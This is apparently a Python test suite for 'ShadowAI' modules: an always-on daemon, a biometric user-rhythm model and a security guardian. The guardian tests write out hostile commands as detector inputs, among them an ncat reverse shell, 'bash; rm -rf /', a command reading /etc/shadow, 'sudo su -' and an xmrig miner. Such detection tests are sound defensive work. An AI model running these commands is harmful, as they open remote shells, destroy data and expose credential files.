"""
Sprint 125 tests: AutonomousDaemon + SecurityGuardian + MultiModalObserver + UserRhythmModel

Tests for the always-on autonomous processing engine that makes ShadowAI
a living cognitive system — not just a text assistant.

Sprint 125 Part 3: Removed CircadianPhase, added UserActivityState + UserRhythmModel.
ShadowAI is always on — it models the USER's patterns, not its own sleep cycle.
"Shadows don't rest."
"""

import asyncio
import copy
import json
import os
import tempfile
import threading
import time
import pytest

from shadowd.cognition.autonomous_daemon import (
    AutonomousDaemon, SecurityGuardian, MultiModalObserver,
    UserActivityState, RhythmSample, UserRhythmModel,
    ObservationType, ObservationPulse,
    AutonomousActionType, AutonomousDecision,
    SecurityEventType, ThreatLevel, SecurityEvent,
    FileIntegrityEntry, _sanitize, _sanitize_strict,
)


class TestSanitization:
    def test_sanitize_preserves_angle_brackets(self):
        assert _sanitize("latency < 100ms") == "latency < 100ms"

    def test_sanitize_strips_control_chars(self):
        assert _sanitize("hello\x00world") == "helloworld"

    def test_sanitize_strict_strips_angle_brackets(self):
        assert _sanitize_strict("latency < 100ms") == "latency  100ms"

    def test_sanitize_strict_strips_control_chars(self):
        assert _sanitize_strict("hello\x00world") == "helloworld"

    def test_sanitize_strict_strips_tabs_newlines(self):
        assert _sanitize_strict("hello\tworld\nhere") == "helloworldhere"

    def test_sanitize_preserves_tabs_newlines(self):
        assert _sanitize("hello\tworld\nhere") == "hello\tworld\nhere"


class TestUserActivityState:
    def test_all_states_exist(self):
        assert UserActivityState.PRESENT
        assert UserActivityState.IDLE
        assert UserActivityState.AWAY
        assert UserActivityState.UNKNOWN

    def test_state_values(self):
        assert UserActivityState.PRESENT.value == "present"
        assert UserActivityState.IDLE.value == "idle"
        assert UserActivityState.AWAY.value == "away"
        assert UserActivityState.UNKNOWN.value == "unknown"

    def test_state_from_string(self):
        assert UserActivityState("present") == UserActivityState.PRESENT
        assert UserActivityState("idle") == UserActivityState.IDLE
        assert UserActivityState("away") == UserActivityState.AWAY


class TestRhythmSample:
    def test_creation_with_defaults(self):
        sample = RhythmSample()
        assert sample.activity_state == UserActivityState.UNKNOWN
        assert sample.heart_rate is None
        assert sample.hrv is None
        assert sample.step_count is None
        assert sample.sleep_hours is None
        assert sample.stress_level is None
        assert sample.screen_on is None
        assert sample.location_type == ""

    def test_creation_with_data(self):
        sample = RhythmSample(
            activity_state=UserActivityState.PRESENT,
            heart_rate=72.0,
            hrv=45.0,
            step_count=3500,
            sleep_hours=7.5,
            stress_level=0.3,
            screen_on=True,
            location_type="home",
        )
        assert sample.activity_state == UserActivityState.PRESENT
        assert sample.heart_rate == 72.0
        assert sample.hrv == 45.0
        assert sample.step_count == 3500
        assert sample.sleep_hours == 7.5
        assert sample.stress_level == 0.3
        assert sample.screen_on is True
        assert sample.location_type == "home"

    def test_heart_rate_clamped(self):
        sample = RhythmSample(heart_rate=500.0)
        assert sample.heart_rate == 300.0
        sample2 = RhythmSample(heart_rate=-10.0)
        assert sample2.heart_rate == 0.0

    def test_hrv_clamped(self):
        sample = RhythmSample(hrv=999.0)
        assert sample.hrv == 500.0

    def test_stress_level_clamped(self):
        sample = RhythmSample(stress_level=2.0)
        assert sample.stress_level == 1.0
        sample2 = RhythmSample(stress_level=-0.5)
        assert sample2.stress_level == 0.0

    def test_sleep_hours_clamped(self):
        sample = RhythmSample(sleep_hours=30.0)
        assert sample.sleep_hours == 24.0
        sample2 = RhythmSample(sleep_hours=-1.0)
        assert sample2.sleep_hours == 0.0

    def test_location_type_sanitized(self):
        sample = RhythmSample(location_type="home<script>alert(1)</script>")
        assert "<" not in sample.location_type
        assert "script" in sample.location_type

    def test_timestamp_auto_generated(self):
        sample = RhythmSample()
        assert sample.timestamp != ""
        assert "T" in sample.timestamp  # ISO format

    def test_to_dict(self):
        sample = RhythmSample(
            activity_state=UserActivityState.PRESENT,
            heart_rate=72.0,
        )
        d = sample.to_dict()
        assert d["activity_state"] == "present"
        assert d["heart_rate"] == 72.0
        assert d["hrv"] is None


class TestUserRhythmModel:
    def test_creation(self):
        model = UserRhythmModel()
        assert model.get_user_state() == UserActivityState.UNKNOWN

    def test_ingest_sample(self):
        model = UserRhythmModel()
        sample = RhythmSample(
            activity_state=UserActivityState.PRESENT,
            heart_rate=72.0,
            stress_level=0.2,
        )
        model.ingest(sample)
        assert model.get_user_state() == UserActivityState.PRESENT

    def test_ingest_multiple_samples(self):
        model = UserRhythmModel()
        for i in range(10):
            sample = RhythmSample(
                activity_state=UserActivityState.PRESENT,
                heart_rate=70.0 + i,
                stress_level=0.2,
            )
            model.ingest(sample)
        baselines = model.get_baselines()
        assert baselines["avg_heart_rate"] is not None
        assert baselines["avg_heart_rate"] > 0

    def test_activity_schedule(self):
        model = UserRhythmModel()
        for hour in range(8, 18):
            sample = RhythmSample(
                activity_state=UserActivityState.PRESENT,
                location_type="work",
            )
            model.ingest(sample)
        schedule = model.get_activity_schedule()
        assert isinstance(schedule, dict)
        assert len(schedule) == 24

    def test_transitions_tracked(self):
        model = UserRhythmModel()
        model.ingest(RhythmSample(activity_state=UserActivityState.PRESENT))
        model.ingest(RhythmSample(activity_state=UserActivityState.IDLE))
        model.ingest(RhythmSample(activity_state=UserActivityState.AWAY))
        transitions = model.get_recent_transitions(limit=10)
        assert len(transitions) >= 2

    def test_location_history(self):
        model = UserRhythmModel()
        model.ingest(RhythmSample(location_type="home"))
        model.ingest(RhythmSample(location_type="work"))
        model.ingest(RhythmSample(location_type="gym"))
        stats = model.get_stats()
        assert stats["locations_tracked"] >= 3

    def test_stress_tracking(self):
        model = UserRhythmModel()
        for _ in range(5):
            model.ingest(RhythmSample(stress_level=0.3))
        assert model.get_current_stress() is not None
        assert not model.is_stress_elevated()

    def test_stress_elevated(self):
        model = UserRhythmModel()
        for _ in range(5):
            model.ingest(RhythmSample(stress_level=0.3))
        for _ in range(3):
            model.ingest(RhythmSample(stress_level=0.9))
        assert model.is_stress_elevated()

    def test_get_stats(self):
        model = UserRhythmModel()
        model.ingest(RhythmSample(
            activity_state=UserActivityState.PRESENT,
            heart_rate=72.0,
            hrv=45.0,
            sleep_hours=7.5,
            stress_level=0.3,
        ))
        stats = model.get_stats()
        assert "samples_total" in stats
        assert "current_state" in stats
        assert "avg_heart_rate" in stats
        assert stats["samples_total"] == 1

    def test_idle_after_timeout(self):
        model = UserRhythmModel()
        model.ingest(RhythmSample(activity_state=UserActivityState.PRESENT))
        assert model.get_user_state() == UserActivityState.PRESENT
        model._last_sample_time = time.monotonic() - 600  # 10 minutes ago
        assert model.get_user_state() == UserActivityState.IDLE

    def test_away_after_long_timeout(self):
        model = UserRhythmModel()
        model.ingest(RhythmSample(activity_state=UserActivityState.PRESENT))
        model._last_sample_time = time.monotonic() - 2000  # 33 minutes ago
        assert model.get_user_state() == UserActivityState.AWAY

    def test_thread_safety_concurrent_ingest(self):
        model = UserRhythmModel()
        errors = []

        def ingest_samples(n):
            try:
                for i in range(n):
                    model.ingest(RhythmSample(
                        activity_state=UserActivityState.PRESENT,
                        heart_rate=70.0 + i * 0.1,
                        stress_level=0.2,
                    ))
            except Exception as e:
                errors.append(type(e).__name__)

        threads = [threading.Thread(target=ingest_samples, args=(50,)) for _ in range(4)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        assert len(errors) == 0
        assert model.get_stats()["samples_total"] == 200

    def test_hrv_baseline(self):
        model = UserRhythmModel()
        for _ in range(5):
            model.ingest(RhythmSample(hrv=50.0))
        baselines = model.get_baselines()
        assert baselines["avg_hrv"] == 50.0

    def test_sleep_baseline(self):
        model = UserRhythmModel()
        for _ in range(5):
            model.ingest(RhythmSample(sleep_hours=7.0))
        baselines = model.get_baselines()
        assert baselines["avg_sleep_hours"] == 7.0

    def test_no_circadian_phase_class_exists_in_module(self):
        import shadowd.cognition.autonomous_daemon as adm
        assert not hasattr(adm, 'CircadianPhase')
        assert not hasattr(adm, 'PHASE_SCHEDULE')
        assert not hasattr(adm, 'PHASE_TICK_MULT')


class TestObservationPulse:
    def test_creation(self):
        p = ObservationPulse(
            observation_type=ObservationType.SYSTEM_METRICS,
            data={"cpu": 80.0, "mem": 4.2},
            confidence=0.9,
            source="test",
        )
        assert p.observation_type == ObservationType.SYSTEM_METRICS
        assert p.confidence == 0.9
        assert p.pulse_id.startswith("op_")

    def test_confidence_clamped(self):
        p = ObservationPulse(confidence=1.5)
        assert p.confidence == 1.0
        p2 = ObservationPulse(confidence=-0.5)
        assert p2.confidence == 0.0

    def test_data_sanitized(self):
        p = ObservationPulse(
            data={"key<script>": "value\x00ok", "normal": 42},
        )
        assert "keyscript" in p.data
        assert p.data.get("keyscript") == "valueok"
        assert p.data["normal"] == 42

    def test_data_key_count_capped_at_50(self):
        data = {f"k{i}": i for i in range(100)}
        p = ObservationPulse(data=data)
        assert len(p.data) <= 50

    def test_to_dict_returns_copy(self):
        p = ObservationPulse(data={"a": 1})
        d = p.to_dict()
        d["data"]["a"] = 999
        assert p.data["a"] == 1


class TestAutonomousDecision:
    def test_creation(self):
        d = AutonomousDecision(
            action_type=AutonomousActionType.SECURITY_SCAN,
            reason="Routine scan",
            confidence=0.8,
            risk_level=0.1,
        )
        assert d.decision_id.startswith("ad_")
        assert d.action_type == AutonomousActionType.SECURITY_SCAN

    def test_confidence_risk_clamped(self):
        d = AutonomousDecision(confidence=2.0, risk_level=-0.5)
        assert d.confidence == 1.0
        assert d.risk_level == 0.0

    def test_reason_sanitized(self):
        d = AutonomousDecision(reason="Hello\x00World")
        assert "\x00" not in d.reason

    def test_to_dict_returns_copy(self):
        d = AutonomousDecision(context={"key": "val"})
        dd = d.to_dict()
        dd["context"]["key"] = "modified"
        assert d.context["key"] == "val"


class TestSecurityEvent:
    def test_creation(self):
        e = SecurityEvent(
            event_type=SecurityEventType.AUTH_FAILURE,
            threat_level=ThreatLevel.LOW,
            description="Failed login attempt",
            source="10.0.0.1",
        )
        assert e.event_id.startswith("se_")
        assert e.threat_level == ThreatLevel.LOW

    def test_description_sanitized(self):
        e = SecurityEvent(description="Attack\x00detected<script>")
        assert "\x00" not in e.description

    def test_source_sanitized_strict(self):
        e = SecurityEvent(source="host<script>.local")
        assert "<" not in e.source

    def test_to_dict_returns_copy(self):
        e = SecurityEvent(details={"ip": "10.0.0.1"})
        d = e.to_dict()
        d["details"]["ip"] = "modified"
        assert e.details["ip"] == "10.0.0.1"


class TestMultiModalObserver:
    def test_system_metrics(self):
        obs = MultiModalObserver()
        pulse = obs.observe_system_metrics()
        assert pulse.observation_type == ObservationType.SYSTEM_METRICS
        assert "cpu_count" in pulse.data
        assert pulse.confidence > 0

    def test_processes_observation(self):
        obs = MultiModalObserver()
        pulse = obs.observe_processes()
        assert pulse.observation_type == ObservationType.PROCESS
        assert isinstance(pulse.data.get("processes", []), list)

    def test_network_observation(self):
        obs = MultiModalObserver()
        pulse = obs.observe_network()
        assert pulse.observation_type == ObservationType.NETWORK
        assert "connections" in pulse.data

    def test_filesystem_watch(self):
        obs = MultiModalObserver()
        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
            f.write("test content")
            f.flush()
            path = f.name
        try:
            result = obs.add_watch_path(path)
            assert result is True
            assert path in obs.get_watched_paths()

            pulse = obs.observe_filesystem()
            assert pulse.observation_type == ObservationType.FILESYSTEM

            obs.remove_watch_path(path)
            assert path not in obs.get_watched_paths()
        finally:
            os.unlink(path)

    def test_file_integrity_detection(self):
        obs = MultiModalObserver()
        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
            f.write("original content")
            f.flush()
            path = f.name
        try:
            obs.add_watch_path(path)
            obs.observe_filesystem()

            with open(path, 'w') as f:
                f.write("modified content")

            pulse = obs.observe_filesystem()
            changes = pulse.data.get("changes", [])
            assert len(changes) > 0
            assert changes[0]["change"] == "modified"
        finally:
            os.unlink(path)

    def test_nonexistent_path_rejected(self):
        obs = MultiModalObserver()
        result = obs.add_watch_path("/nonexistent/path/abc123")
        assert result is False

    def test_observation_count(self):
        obs = MultiModalObserver()
        obs.observe_system_metrics()
        obs.observe_system_metrics()
        assert obs.get_observation_count() >= 2

    def test_stats(self):
        obs = MultiModalObserver()
        stats = obs.get_stats()
        assert "observations_total" in stats
        assert "watched_paths" in stats

    def test_recent_observations(self):
        obs = MultiModalObserver()
        obs.observe_system_metrics()
        recent = obs.get_recent_observations(limit=5)
        assert len(recent) >= 1
        assert recent[0]["pulse_id"].startswith("op_")

    def test_file_integrity_entries(self):
        obs = MultiModalObserver()
        entries = obs.get_file_integrity()
        assert isinstance(entries, list)

    def test_max_observations_bounded(self):
        obs = MultiModalObserver()
        obs._MAX_OBSERVATIONS = 10
        obs._observations = __import__('collections').deque(maxlen=10)
        for i in range(50):
            obs.observe_system_metrics()
        assert obs._observations.maxlen == 10


class TestSecurityGuardian:
    def test_auth_failure_tracking(self):
        g = SecurityGuardian()
        event = g.record_auth_failure("10.0.0.1", "wrong password")
        assert event.event_type == SecurityEventType.AUTH_FAILURE
        assert event.threat_level == ThreatLevel.LOW

    def test_brute_force_detection(self):
        g = SecurityGuardian()
        for i in range(12):
            g.record_auth_failure(f"10.0.0.{i}", "attempt")
        last_events = g.get_recent_events(limit=5)
        high_threat = [e for e in last_events if e["threat_level"] >= ThreatLevel.MEDIUM]
        assert len(high_threat) > 0

    def test_suspicious_process_detection(self):
        g = SecurityGuardian()
        g._process_baseline = {"normal_app", "sshd"}
        processes = [
            {"command": "ncat -l -p 4444", "pid": "666"},
        ]
        events = g.scan_processes(processes)
        assert len(events) > 0
        assert any(e.event_type == SecurityEventType.PROCESS_ANOMALY for e in events)

    def test_suspicious_port_detection(self):
        g = SecurityGuardian()
        connections = ["tcp ESTAB 0.0.0.0:4444->192.168.1.1:80"]
        events = g.scan_network(connections)
        assert len(events) > 0
        assert events[0].event_type == SecurityEventType.NETWORK_ANOMALY

    def test_resource_abuse_detection(self):
        g = SecurityGuardian()
        metrics = {"load_avg_1m": 50.0, "cpu_count": 1, "disk_usage_pct": 97}
        event = g.check_resource_abuse(metrics)
        assert event is not None
        assert event.threat_level >= ThreatLevel.HIGH

    def test_file_integrity_check(self):
        g = SecurityGuardian()
        entries = [{"path": "/etc/shadow", "modified": True}]
        events = g.check_file_integrity(entries)
        assert len(events) > 0
        assert events[0].event_type == SecurityEventType.FILE_INTEGRITY

    def test_zero_day_indicators(self):
        g = SecurityGuardian()
        context = {"command": "python3 -c import os; os.system('cat /etc/shadow')"}
        events = g.detect_zero_day_indicators(context)
        assert len(events) > 0
        assert events[0].event_type == SecurityEventType.ZERO_DAY_INDICATOR

    def test_kill_switch(self):
        g = SecurityGuardian()
        assert not g.is_kill_switch_engaged()
        result = g.engage_kill_switch()
        assert result["action"] == "kill_switch_engaged"
        assert g.is_kill_switch_engaged()

    def test_disengage_kill_switch(self):
        g = SecurityGuardian()
        g.engage_kill_switch()
        result = g.disengage_kill_switch()
        assert result["action"] == "kill_switch_disengaged"
        assert not g.is_kill_switch_engaged()

    def test_auto_kill_switch_on_critical(self):
        g = SecurityGuardian()
        g._auto_response_enabled = True
        g._update_threat_level(ThreatLevel.CRITICAL)
        assert g.is_kill_switch_engaged()

    def test_stats(self):
        g = SecurityGuardian()
        g.record_auth_failure("10.0.0.1")
        stats = g.get_stats()
        assert "threat_level" in stats
        assert "scans_run" in stats
        assert stats["auth_failures_total"] == 1

    def test_max_events_bounded(self):
        g = SecurityGuardian()
        g._MAX_EVENTS = 10
        g._events = __import__('collections').deque(maxlen=10)
        for i in range(50):
            g.record_auth_failure(f"10.0.{i}.1")
        assert len(g._events) <= 10


class TestAutonomousDaemon:
    def test_creation(self):
        d = AutonomousDaemon(base_tick_seconds=15.0)
        assert not d.is_running()
        assert d.get_user_state() in list(UserActivityState)

    def test_no_phase_schedule(self):
        d = AutonomousDaemon(base_tick_seconds=15.0)
        assert not hasattr(d, 'PHASE_SCHEDULE')
        assert not hasattr(d, 'PHASE_TICK_MULT')
        assert not hasattr(d, '_current_phase')

    def test_default_tick_is_15(self):
        d = AutonomousDaemon()
        assert d._base_tick == 15.0

    def test_base_tick_clamped(self):
        d1 = AutonomousDaemon(base_tick_seconds=0.1)
        assert d1._base_tick >= AutonomousDaemon._MIN_TICK_INTERVAL
        d2 = AutonomousDaemon(base_tick_seconds=9999)
        assert d2._base_tick <= AutonomousDaemon._MAX_TICK_INTERVAL

    def test_get_status(self):
        d = AutonomousDaemon(base_tick_seconds=15.0)
        status = d.get_status()
        assert "running" in status
        assert "user_state" in status
        assert "tick_interval_seconds" in status
        assert "observer_stats" in status
        assert "guardian_stats" in status
        assert "user_rhythm_baselines" in status

    def test_get_health(self):
        d = AutonomousDaemon(base_tick_seconds=15.0)
        health = d.get_health()
        assert "status" in health
        assert "kill_switch" in health
        assert "threat_level" in health
        assert "user_state" in health

    def test_kill_switch_halt(self):
        d = AutonomousDaemon(base_tick_seconds=15.0)
        d.engage_kill_switch()
        assert d.guardian.is_kill_switch_engaged()

    def test_release_kill_switch(self):
        d = AutonomousDaemon(base_tick_seconds=15.0)
        d.engage_kill_switch()
        d.disengage_kill_switch()
        assert not d.guardian.is_kill_switch_engaged()

    def test_decisions_empty_initially(self):
        d = AutonomousDaemon(base_tick_seconds=15.0)
        assert d.get_decisions() == []

    def test_force_observe_system_metrics(self):
        d = AutonomousDaemon(base_tick_seconds=15.0)
        result = d.force_observe(ObservationType.SYSTEM_METRICS)
        assert result["observation_type"] == "system_metrics"
        assert "cpu_count" in result["data"]

    def test_force_observe_processes(self):
        d = AutonomousDaemon(base_tick_seconds=15.0)
        result = d.force_observe(ObservationType.PROCESS)
        assert result["observation_type"] == "process"

    def test_watch_path_management(self):
        d = AutonomousDaemon(base_tick_seconds=15.0)
        with tempfile.NamedTemporaryFile(suffix='.txt', delete=False) as f:
            path = f.name
        try:
            result = d.add_watch_path(path)
            assert result is True
            d.remove_watch_path(path)
        finally:
            os.unlink(path)

    def test_security_events(self):
        d = AutonomousDaemon(base_tick_seconds=15.0)
        d.guardian.record_auth_failure("10.0.0.1")
        events = d.get_security_events(limit=10)
        assert len(events) >= 1

    def test_observations(self):
        d = AutonomousDaemon(base_tick_seconds=15.0)
        d.observer.observe_system_metrics()
        observations = d.get_observations(limit=10)
        assert len(observations) >= 1

    def test_rate_limiting(self):
        d = AutonomousDaemon(base_tick_seconds=15.0)
        assert d._rate_limit("security_scan") > 0
        assert d._rate_limit("consolidation") > 0
        assert d._rate_limit("dream_cycle") > 0

    def test_action_rate_limits_prevent_runaway(self):
        d = AutonomousDaemon(base_tick_seconds=15.0)
        for action, interval in d._action_rate_limits.items():
            assert interval >= 15.0, f"Rate limit for {action} too aggressive: {interval}s"

    def test_ingest_user_vitals(self):
        d = AutonomousDaemon(base_tick_seconds=15.0)
        sample = RhythmSample(
            activity_state=UserActivityState.PRESENT,
            heart_rate=72.0,
            stress_level=0.2,
        )
        d.ingest_user_vitals(sample)
        assert d.get_user_state() == UserActivityState.PRESENT

    def test_ingest_multiple_vitals(self):
        d = AutonomousDaemon(base_tick_seconds=15.0)
        for i in range(10):
            d.ingest_user_vitals(RhythmSample(
                activity_state=UserActivityState.PRESENT,
                heart_rate=70.0 + i,
                stress_level=0.2 + i * 0.01,
            ))
        baselines = d.user_rhythm.get_baselines()
        assert baselines["avg_heart_rate"] is not None
        assert baselines["avg_stress"] is not None

    def test_user_state_affects_processing(self):
        d = AutonomousDaemon(base_tick_seconds=15.0)
        d.ingest_user_vitals(RhythmSample(activity_state=UserActivityState.PRESENT))
        state = d.get_user_state()
        assert state == UserActivityState.PRESENT


class TestShadowOSDaemonIntegration:
    def test_daemon_on_shadow_os(self):
        from shadowd.cognition.shadow_os import ShadowOS
        sos = ShadowOS()
        assert hasattr(sos, 'daemon')
        assert sos.daemon is not None
        assert isinstance(sos.daemon, AutonomousDaemon)

    def test_daemon_tick_is_15(self):
        from shadowd.cognition.shadow_os import ShadowOS
        sos = ShadowOS()
        assert sos.daemon._base_tick == 15.0

    def test_daemon_status_method(self):
        from shadowd.cognition.shadow_os import ShadowOS
        sos = ShadowOS()
        status = sos.get_daemon_status()
        assert "running" in status
        assert "user_state" in status

    def test_daemon_observations_method(self):
        from shadowd.cognition.shadow_os import ShadowOS
        sos = ShadowOS()
        obs = sos.get_daemon_observations(limit=5)
        assert isinstance(obs, list)

    def test_daemon_decisions_method(self):
        from shadowd.cognition.shadow_os import ShadowOS
        sos = ShadowOS()
        decisions = sos.get_daemon_decisions(limit=5)
        assert isinstance(decisions, list)

    def test_security_events_method(self):
        from shadowd.cognition.shadow_os import ShadowOS
        sos = ShadowOS()
        events = sos.get_security_events(limit=5)
        assert isinstance(events, list)

    def test_daemon_in_health_check(self):
        from shadowd.cognition.shadow_os import ShadowOS
        sos = ShadowOS()
        sos._running = True
        health = sos.get_health()
        assert "autonomous_daemon" in health.get("modules", {})

    def test_daemon_in_status(self):
        from shadowd.cognition.shadow_os import ShadowOS
        sos = ShadowOS()
        status = sos.get_status()
        assert "daemon_status" in status

    def test_daemon_watch_add_remove(self):
        from shadowd.cognition.shadow_os import ShadowOS
        import os as _os
        sos = ShadowOS()
        with tempfile.NamedTemporaryFile(suffix='.txt', delete=False) as f:
            path = f.name
        try:
            result = sos.daemon_add_watch(path)
            assert result is True
            sos.daemon_remove_watch(path)
        finally:
            _os.unlink(path)

    def test_force_observe(self):
        from shadowd.cognition.shadow_os import ShadowOS
        sos = ShadowOS()
        result = sos.daemon_force_observe("system_metrics")
        assert result["observation_type"] == "system_metrics"

    def test_kill_switch_method(self):
        from shadowd.cognition.shadow_os import ShadowOS
        sos = ShadowOS()
        result = sos.daemon_kill_switch()
        assert result["action"] == "kill_switch_engaged"
        sos.daemon_release_kill_switch()

    def test_shadow_os_set_on_daemon(self):
        from shadowd.cognition.shadow_os import ShadowOS
        sos = ShadowOS()
        assert sos.daemon._shadow_os is sos

    def test_ingest_user_vitals_method(self):
        from shadowd.cognition.shadow_os import ShadowOS
        sos = ShadowOS()
        sample = RhythmSample(
            activity_state=UserActivityState.PRESENT,
            heart_rate=72.0,
        )
        sos.ingest_user_vitals(sample)
        assert sos.get_user_activity_state() == UserActivityState.PRESENT

    def test_get_user_rhythm_baselines(self):
        from shadowd.cognition.shadow_os import ShadowOS
        sos = ShadowOS()
        baselines = sos.get_user_rhythm_baselines()
        assert isinstance(baselines, dict)

    def test_no_circadian_phase_in_shadow_os(self):
        from shadowd.cognition import shadow_os
        assert not hasattr(shadow_os, 'CircadianPhase')


class TestDaemonAPIEndpoints:
    def test_daemon_endpoints_registered(self):
        from shadowd.cognition.api_router import router
        paths = [r.path for r in router.routes]
        assert "/os/daemon/status" in paths
        assert "/os/daemon/observations" in paths
        assert "/os/daemon/decisions" in paths
        assert "/os/daemon/security-events" in paths
        assert "/os/daemon/watch" in paths
        assert "/os/daemon/observe" in paths
        assert "/os/daemon/kill-switch" in paths
        assert "/os/daemon/release-kill-switch" in paths
        assert "/os/daemon/vitals" in paths
        assert "/os/daemon/vitals/baselines" in paths
        assert "/os/daemon/vitals/state" in paths

    def test_watch_request_model(self):
        # The model rejects absolute paths outside $HOME. Use one under $HOME
        # so we exercise the success path; traversal/scope rejection has its
        # own test elsewhere.
        from pathlib import Path
        from shadowd.cognition.api_router import DaemonWatchRequest
        target = str(Path.home() / "tmp_test_dir")
        req = DaemonWatchRequest(path=target)
        assert req.path == target

    def test_observe_request_model(self):
        from shadowd.cognition.api_router import DaemonObserveRequest
        req = DaemonObserveRequest(observation_type="network")
        assert req.observation_type == "network"

    def test_vitals_request_model(self):
        from shadowd.cognition.api_router import DaemonVitalsRequest
        req = DaemonVitalsRequest(
            activity_state="present",
            heart_rate=72.0,
            stress_level=0.3,
        )
        assert req.activity_state == "present"
        assert req.heart_rate == 72.0
        assert req.stress_level == 0.3


class TestSecurityDeepDive:
    def test_shell_injection_detected(self):
        g = SecurityGuardian()
        ctx = {"command": "bash; rm -rf /"}
        events = g.detect_zero_day_indicators(ctx)
        assert len(events) > 0

    def test_privilege_escalation_detected(self):
        g = SecurityGuardian()
        ctx = {"command": "sudo su -"}
        events = g.detect_zero_day_indicators(ctx)
        assert len(events) > 0

    def test_cryptominer_detected(self):
        g = SecurityGuardian()
        g._process_baseline = {"sshd", "bash"}
        events = g.scan_processes([{"command": "xmrig --pool", "pid": "999"}])
        assert len(events) > 0
        assert events[0].threat_level == ThreatLevel.CRITICAL

    def test_reverse_shell_detected(self):
        g = SecurityGuardian()
        g._process_baseline = {"sshd", "bash"}
        events = g.scan_processes([{"command": "ncat 10.0.0.1 4444 -e /bin/bash", "pid": "999"}])
        assert len(events) > 0
        assert events[0].threat_level == ThreatLevel.CRITICAL

    def test_normal_traffic_not_flagged(self):
        g = SecurityGuardian()
        events = g.scan_network(["tcp ESTAB 10.0.0.1:443->93.184.216.34:443"])
        assert len(events) == 0

    def test_resource_ok_not_flagged(self):
        g = SecurityGuardian()
        event = g.check_resource_abuse({"load_avg_1m": 2.0, "cpu_count": 8, "disk_usage_pct": 50})
        assert event is None

    def test_unmodified_file_not_flagged(self):
        g = SecurityGuardian()
        events = g.check_file_integrity([{"path": "/etc/hosts", "modified": False}])
        assert len(events) == 0

    def test_kill_switch_stops_daemon_processing(self):
        d = AutonomousDaemon(base_tick_seconds=15.0)
        d.engage_kill_switch()
        assert d.guardian.is_kill_switch_engaged()
        assert d.get_health()["kill_switch"] is True

    def test_thread_safety_concurrent_auth_failures(self):
        g = SecurityGuardian()
        errors = []

        def record_failures(n):
            try:
                for i in range(n):
                    g.record_auth_failure(f"10.0.{n}.{i}")
            except Exception as e:
                errors.append(type(e).__name__)

        threads = [threading.Thread(target=record_failures, args=(10,)) for _ in range(5)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        assert len(errors) == 0

    def test_thread_safety_concurrent_observations(self):
        obs = MultiModalObserver()
        errors = []

        def observe(n):
            try:
                for _ in range(n):
                    obs.observe_system_metrics()
            except Exception as e:
                errors.append(type(e).__name__)

        threads = [threading.Thread(target=observe, args=(5,)) for _ in range(4)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        assert len(errors) == 0

    def test_thread_safety_concurrent_vitals(self):
        model = UserRhythmModel()
        errors = []

        def ingest_vitals(n):
            try:
                for i in range(n):
                    model.ingest(RhythmSample(
                        activity_state=UserActivityState.PRESENT,
                        heart_rate=70.0 + i * 0.1,
                    ))
            except Exception as e:
                errors.append(type(e).__name__)

        threads = [threading.Thread(target=ingest_vitals, args=(20,)) for _ in range(5)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        assert len(errors) == 0